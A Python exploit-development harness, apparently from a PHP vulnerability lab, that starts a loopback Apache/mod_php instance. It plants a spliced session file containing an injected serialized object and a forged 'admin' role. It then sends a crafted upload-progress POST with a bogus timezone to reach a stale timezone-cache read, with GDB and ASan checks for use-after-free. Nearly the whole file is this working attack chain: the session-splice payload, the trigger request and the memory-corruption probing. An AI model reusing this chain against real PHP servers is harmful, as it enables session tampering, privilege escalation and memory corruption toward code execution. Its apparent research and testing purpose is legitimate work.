#!/usr/bin/env python3
"""Stage A combined-chain probe on mod_php / Apache prefork (loopback only).

Closes the last SAPI UNKNOWN: does the splice + invalid-date.timezone chain
reach the stale DATEG(tzcache) read under mod_php?  Each case starts a fresh
loopback Apache with one prefork child, pre-stages the spliced session file,
and sends one multipart upload-progress POST with the session cookie.  The
Apache error log and (for sanitizer builds) the PHP error log are preserved
verbatim next to the verdict.

Usage: python3 lab/repro/php2shell-stageA-apache.py <libphp.so> [outdir] [case...]
Cases: splice (default), nocookie, validtz.  Add --asan to preload ASan/UBSan.
"""
import os
import pathlib
import re
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import time

HERE = pathlib.Path(__file__).resolve().parent
ROOT = HERE.parent.parent
APACHE_ROOT = ROOT / 'lab/apache2root'
BASE_CONF = APACHE_ROOT / 'conf/httpd.conf'
SID = 'tzsplice'
OBJ = 'evil|O:8:"stdClass":1:{s:5:"proof";s:5:"pwned";}'

GDB = '''set pagination off
set confirm off
set auto-load safe-path /
set breakpoint pending on
set follow-fork-mode child
set detach-on-fork on
set $n = 0
break php_date.c:505
commands 1
  silent
  set $n = $n + 1
  set $st = date_globals.tzcache
  printf "STALE n=%d tc=%p flags=%08x mask=%08x arData=%p nNumUsed=%08x nNumOfEl=%08x\\n", $n, $st, *(unsigned int*)((char*)$st+8), *(unsigned int*)((char*)$st+12), *(void**)((char*)$st+16), *(unsigned int*)((char*)$st+24), *(unsigned int*)((char*)$st+28)
  x/7gx $st
  if $n >= 6
    printf "DONE\\n"
    quit
  end
  continue
end
run
quit
'''
SPLICE = ('data|s:64:"' + 'A' * 88 + OBJ + 'B' * 32 +
          '";roles|a:1:{i:0;s:5:"admin";}')
BOUND = '---------------------------20896060251896012921717172737'


def wait_port(port, want_up=True):
    for _ in range(120):
        up = False
        try:
            with socket.create_connection(('127.0.0.1', port), timeout=0.2):
                up = True
        except OSError:
            pass
        if up == want_up:
            return True
        time.sleep(0.1)
    return False


def http_post(port, body, cookie, query=''):
    path = '/worker.php' + (('?' + query) if query else '')
    hdr = (f'POST {path} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n'
           f'Content-Type: multipart/form-data; boundary={BOUND}\r\n'
           f'Content-Length: {len(body)}\r\nConnection: close\r\n')
    if cookie:
        hdr += f'Cookie: PHPSESSID={SID}\r\n'
    with socket.create_connection(('127.0.0.1', port), timeout=30) as s:
        s.sendall((hdr + '\r\n').encode() + body)
        buf = b''
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            buf += chunk
    return buf


def run_case(lib, out, port, case, asan, query, gdb=False):
    d = pathlib.Path(tempfile.mkdtemp(prefix='apache-stageA-'))
    sess, ini, htdocs = d / 'sess', d / 'ini', d / 'htdocs'
    sess.mkdir(); ini.mkdir(); htdocs.mkdir()
    (sess / ('sess_' + SID)).write_text(SPLICE)
    (htdocs / 'worker.php').write_text('<?php echo "worker\\n";')
    body = (('--%s\r\nContent-Disposition: form-data; '
             'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nprog\r\n' % BOUND)
            + ('--%s\r\nContent-Disposition: form-data; name="file1"; '
               'filename="a.txt"\r\n\r\n1\r\n' % BOUND)
            + ('--%s--\r\n' % BOUND)).encode()
    (d / 'body').write_bytes(body)
    tz = 'America/New_York' if case == 'validtz' else 'Bogus/Zone'
    cookie = case != 'nocookie'
    (ini / 'php.ini').write_text(f'''memory_limit=16M
max_execution_time=0
max_input_vars=10000
html_errors=0
display_errors=0
display_startup_errors=0
log_errors=1
error_reporting=32767
date.timezone={tz}
error_log={d}/php-error.log
session.save_path={sess}
session.name=PHPSESSID
session.use_strict_mode=0
session.use_cookies=1
session.cache_limiter=
session.upload_progress.enabled=1
session.upload_progress.cleanup=0
session.upload_progress.prefix=upload_progress_
session.upload_progress.name=PHP_SESSION_UPLOAD_PROGRESS
session.upload_progress.freq=1%
session.upload_progress.min_freq=0.000000001
file_uploads=1
upload_max_filesize=1024
''')
    conf = BASE_CONF.read_text()
    conf = conf.replace('Listen 127.0.0.1:18099', f'Listen 127.0.0.1:{port}')
    conf = conf.replace('ServerName 127.0.0.1:18099', f'ServerName 127.0.0.1:{port}')
    conf = conf.replace('PidFile logs/httpd.pid', f'PidFile {d}/httpd.pid')
    conf = conf.replace('#LoadModule php_module PHPLIB',
                        f'LoadModule php_module {lib}')
    conf = conf.replace('ErrorLog logs/error_log', f'ErrorLog {d}/error_log')
    conf = conf.replace('CustomLog logs/access_log common',
                        f'CustomLog {d}/access_log common')
    conf = conf.replace('DocumentRoot "/home/mesh-home/mishe-tauftauf2shell/lab/apache2root/htdocs"',
                        f'DocumentRoot "{htdocs}"')
    conf = conf.replace('<Directory "/home/mesh-home/mishe-tauftauf2shell/lab/apache2root/htdocs">',
                        f'<Directory "{htdocs}">')
    conf = conf.replace('PHPIniDir "/home/mesh-home/mishe-tauftauf2shell/lab/apache2root/conf"',
                        f'PHPIniDir "{ini}"')
    (d / 'httpd.conf').write_text(conf)

    env = dict(os.environ)
    env.update(USE_ZEND_ALLOC='0', USE_TRACKED_ALLOC='1')
    if asan:
        env['LD_PRELOAD'] = ':'.join(subprocess.check_output(
            ['clang', '-print-file-name=' + n], text=True).strip()
            for n in ('libasan.so', 'libubsan.so'))
        env['ASAN_OPTIONS'] = 'detect_leaks=0:abort_on_error=1'
        env['UBSAN_OPTIONS'] = 'halt_on_error=1'
    if gdb:
        (d / 'probe.gdb').write_text(GDB)
        with (d / 'gdb.out').open('wb') as fo:
            gp = subprocess.Popen(
                ['timeout', '45', 'gdb', '-q', '-batch', '-x', str(d / 'probe.gdb'),
                 '--args', '/usr/sbin/apache2', '-d', str(APACHE_ROOT),
                 '-f', str(d / 'httpd.conf'), '-DFOREGROUND'],
                env=env, stdout=fo, stderr=subprocess.STDOUT,
                start_new_session=True)
            ready = wait_port(port)
            client = b''
            if ready:
                time.sleep(1.5)
                try:
                    client = http_post(port, body, cookie, query)
                except Exception as exc:
                    client = repr(exc).encode()
                (d / 'client.out').write_bytes(client)
                time.sleep(0.5)
            try:
                gp.wait(timeout=50)
            except subprocess.TimeoutExpired:
                os.killpg(gp.pid, signal.SIGKILL)
                gp.wait()
            # GDB quits and detaches the inferior; the prefork parent survives
            # in its own session, so kill it by the unique per-case config path.
            subprocess.run(['pkill', '-9', '-f',
                            f'apache2.*{d}/httpd.conf'],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            wait_port(port, want_up=False)
        ready = True
    else:
        started = subprocess.run(
            ['/usr/sbin/apache2', '-d', str(APACHE_ROOT), '-f', str(d / 'httpd.conf'),
             '-k', 'start'], env=env, stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT, timeout=30)
        (d / 'start.out').write_bytes(started.stdout)
        ready = started.returncode == 0 and wait_port(port)
        client = b''
        if ready:
            try:
                client = http_post(port, body, cookie, query)
            except Exception as exc:
                client = repr(exc).encode()
            (d / 'client.out').write_bytes(client)
            time.sleep(0.5)
        stop = subprocess.run(
            ['/usr/sbin/apache2', '-d', str(APACHE_ROOT), '-f', str(d / 'httpd.conf'),
             '-k', 'stop'], env=env, stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT, timeout=30)
        (d / 'stop.out').write_bytes(stop.stdout)
        wait_port(port, want_up=False)

    log = out / f'apache-{case}.log'
    err = (d / 'error_log').read_text(errors='replace') if (d / 'error_log').exists() else ''
    perr = (d / 'php-error.log').read_text(errors='replace') if (d / 'php-error.log').exists() else ''
    with log.open('w') as fh:
        fh.write(f'case={case} query={query!r} tz={tz} cookie={cookie} asan={asan} gdb={gdb}\n')
        for name in ('start.out', 'gdb.out', 'client.out', 'stop.out'):
            p = d / name
            if p.exists():
                fh.write(f'--- {name} ---\n{p.read_text(errors="replace")[:20000]}\n')
        fh.write(f'--- error_log ---\n{err[:20000]}\n--- php-error.log ---\n{perr[:6000]}\n')
    markers = {
        'uaf': len(re.findall(r'heap-use-after-free|use-after-free', err + perr)),
        'zendhash': len(re.findall(r'zend_hash_str_find_bucket|_zend_is_inconsistent', err + perr)),
        'sigsegv': len(re.findall(r'SIGSEGV|signal 11', err + perr)),
        'staletz': len(re.findall(r'php_date_parse_tzfile', err + perr)),
    }
    shutil.rmtree(d, ignore_errors=True)
    return ready, markers, len(client), log


def main():
    lib = pathlib.Path(sys.argv[1]).resolve()
    out = pathlib.Path(sys.argv[2] if len(sys.argv) > 2 and
                       not sys.argv[2].startswith('--') else
                       'lab/build/evidence/w25-apache-stageA')
    out.mkdir(parents=True, exist_ok=True)
    asan = '--asan' in sys.argv
    gdb = '--gdb' in sys.argv
    qopt = next((a.split('=', 1)[1] for a in sys.argv[2:]
                 if a.startswith('--query=')), 'XXX=ABCDEFGHIJ')
    selected = [a for a in sys.argv[2:] if a in ('splice', 'nocookie', 'validtz')]
    for i, case in enumerate(selected or ['splice']):
        query = qopt
        ready, marks, nclient, log = run_case(lib, out, 18160 + i, case, asan,
                                              query, gdb=gdb)
        print(f'{case}: ready={ready} client_bytes={nclient} markers={marks} log={log}')


if __name__ == '__main__':
    main()
